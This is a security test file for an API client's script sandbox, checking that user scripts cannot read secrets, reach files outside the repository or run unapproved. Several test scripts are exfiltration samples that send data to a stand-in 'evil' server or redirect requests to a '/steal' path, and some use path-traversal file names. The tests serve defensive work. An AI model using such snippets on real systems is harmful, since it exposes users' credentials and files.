import { mkdir, rm, writeFile } from 'node:fs/promises';
import { join } from 'node:path';

import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
    carriesSecret,
    KEY_LINE,
    line,
    scripts,
    startAttack,
    type Attack,
} from './support/attack-fixture.js';
import { SECRET } from './support/send-fixture.js';

let attack: Attack;

beforeEach(async () => {
    attack = await startAttack();
});

afterEach(async () => {
    await attack.stop();
});

/** Nothing of the secret reached either server: `evil` never, and `api` not in this send. */
function nothingLeft(): void {
    expect(attack.evil.hits.filter(carriesSecret)).toEqual([]);
    expect(attack.received.filter(carriesSecret)).toEqual([]);
}

async function writeCollectionHeaders(...pairs: [string, string][]): Promise<void> {
    const folder = join(attack.root, 'workspaces', 'payments', 'collections', 'orders');
    const lines = pairs.map(
        ([key, value]) => `  - key: ${key}\n    value: "${value}"\n    enabled: true\n`,
    );

    await mkdir(folder, { recursive: true });
    await writeFile(join(folder, 'collection.yaml'), `name: Orders\nheaders:\n${lines.join('')}`);
}

describe('a script that reads or fills a secret', () => {
    it('reads no secret: vars.get gives undefined, and the console says so', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`
                const got = vars.get('token');
                request.headers.set('X-Got', String(got));
                await sendRequest({ url: '${attack.evil.url}/get', method: 'POST', body: String(got) });
            `),
        });

        nothingLeft();
        expect(attack.evil.hits).toHaveLength(1);
        expect(attack.received[0]?.headers['x-got']).toBe('undefined');
        expect(attack.told[0]?.logs).toContainEqual({
            level: 'warn',
            notice: 'secret-unreadable',
            params: { name: 'token' },
        });
    });

    it('fills no secret through a value it set, used by a line of the person', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            headers: [line('X-Copy', '{{x}}')],
            ...scripts(`vars.set('x', '{{token}}');`),
        });

        nothingLeft();
        expect(attack.received[0]?.headers['x-copy']).toBeDefined();
    });

    it('fills no secret into a line it wrote, not even through a variable that holds one', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            ...scripts(`
                request.headers.set('X-Direct', '{{token}}');
                request.headers.set('X-Nested', '{{a}}');
                vars.set('b', '{{a}}');
                request.headers.set('X-Twice', '{{b}}');
            `),
        });

        nothingLeft();
        expect(attack.received[0]?.headers['x-direct']).toBe('{{token}}');
    });

    it('fills no secret into a line it wrote behind inherited ones, whatever their order', async () => {
        await writeCollectionHeaders(['X-One', '1'], ['X-Two', '2']);

        const sources = [
            `request.headers.set('X-Api-Key', '{{token}}');`,
            `request.headers.delete('X-One'); request.headers.set('X-Api-Key', '{{token}}');`,
            `request.headers.set('X-Two', '{{token}}');`,
        ];

        for (const source of sources) {
            await attack.send({ url: '{{baseUrl}}/echo', ...scripts(source) });
        }

        nothingLeft();
        expect(attack.received.map(({ headers }) => headers['x-one'])).toEqual([
            '1',
            undefined,
            '1',
        ]);
    });

    it('sends the body it wrote as the text it is, to the same origin', async () => {
        await attack.send({
            method: 'POST',
            url: '{{baseUrl}}/gists',
            body: { type: 'json', content: '{}' },
            ...scripts(`request.body = '{{token}}';`),
        });

        nothingLeft();
        expect(attack.received[0]?.body).toBe('{{token}}');
    });

    it('keeps the secret of the person in a request its scripts left alone', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            headers: [KEY_LINE],
            ...scripts(`test('reads', () => request.headers.get('x-api-key'));`),
        });

        expect(attack.received[0]?.headers['x-api-key']).toBe(SECRET);
    });
});

describe('a script that reaches outside what it may touch', () => {
    it('breaks nothing through __proto__ or constructor', async () => {
        const answer = await attack.send({
            url: '{{baseUrl}}/echo',
            headers: [line('X-Proto', '{{__proto__}}')],
            ...scripts(`
                vars.set('__proto__', '{{token}}');
                vars.set('constructor', '{{token}}');
                request.headers.set('__proto__', '{{token}}');
                request.query.set('__proto__', '{{token}}');
            `),
        });

        nothingLeft();
        expect(answer.ok).toBe(true);
    });

    it('reads no file outside the repo, nor of .mandor, through a field it named', async () => {
        const outside = join(attack.root, '..', `outside-${crypto.randomUUID()}.txt`);

        await writeFile(outside, 'OUTSIDE-BYTES');
        await mkdir(join(attack.root, '.mandor'), { recursive: true });
        await writeFile(join(attack.root, '.mandor', 'kept.txt'), 'MANDOR-BYTES');

        try {
            for (const path of [outside, '../outside.txt', '.mandor/kept.txt']) {
                await attack.send({
                    method: 'POST',
                    url: '{{baseUrl}}/echo',
                    body: { type: 'form', fields: [{ ...line('f', '{{file}}'), kind: 'file' }] },
                    ...scripts(`vars.set('file', ${JSON.stringify(path)});`),
                });
            }
        } finally {
            await rm(outside, { force: true });
        }

        const bodies = attack.received.map(({ body }) => body).join('\n');

        expect(bodies).not.toContain('OUTSIDE-BYTES');
        expect(bodies).not.toContain('MANDOR-BYTES');
    });

    it('writes a body as text: one that names a file sends the name', async () => {
        await attack.send({
            method: 'POST',
            url: '{{baseUrl}}/echo',
            body: { type: 'text', content: 'x' },
            ...scripts(`request.body = '.mandor/kept.txt';`),
        });

        expect(attack.received[0]?.body).toBe('.mandor/kept.txt');
    });
});

describe('a script nobody approved', () => {
    beforeEach(async () => {
        await attack.stop();
        attack = await startAttack(false);
    });

    it('does not run, and the send leaves as the person wrote it', async () => {
        await attack.send({
            url: '{{baseUrl}}/echo',
            headers: [KEY_LINE],
            ...scripts(`request.url = '${attack.evil.url}/steal';`),
        });

        expect(attack.evil.hits).toEqual([]);
        expect(attack.received[0]?.headers['x-api-key']).toBe(SECRET);
        expect(attack.told[0]?.skipped).toHaveLength(1);
    });

    it('does not run once its text changed after it was approved', async () => {
        const request = { url: '{{baseUrl}}/echo', headers: [KEY_LINE] };

        await attack.send({ ...request, ...scripts(`request.headers.set('X-Run', '1');`) });

        for (const key of attack.asked) {
            attack.approved.add(key);
        }

        await attack.send({ ...request, ...scripts(`request.headers.set('X-Run', '1');`) });
        await attack.send({ ...request, ...scripts(`request.url = '${attack.evil.url}/steal';`) });

        expect(attack.received.map(({ headers }) => headers['x-run'])).toEqual([
            undefined,
            '1',
            undefined,
        ]);
        expect(attack.evil.hits).toEqual([]);
    });
});
